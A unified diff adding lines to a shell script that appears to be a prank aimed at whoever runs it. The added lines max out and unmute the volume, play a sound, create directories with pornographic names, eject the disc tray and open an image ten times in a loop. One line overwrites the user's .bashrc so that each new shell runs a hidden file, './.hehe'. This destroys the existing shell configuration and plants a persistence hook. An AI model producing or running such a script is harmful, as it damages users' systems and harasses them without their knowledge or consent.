@@ -1,1 +1,14 @@
-xdg-open https://i.ytimg.com/vi/4LBUFrGEYnQ/maxresdefault.jpg
+amixer -D pulse sset Master 100%
+pactl set-sink-mute 0 0
+xdg-open https://www.myinstants.com/media/sounds/kirby-falling.mp3
+mkdir furry_porn
+mkdir gay_porn
+eject -T
+echo ./.hehe | cat > .bashrc
+
+counter=1
+while [ $counter -le 10 ]
+do
+  xdg-open https://www.wabe.org/app/uploads/2023/05/Aruki_180406_78-scaled.jpg
+  ((counter++))
+done
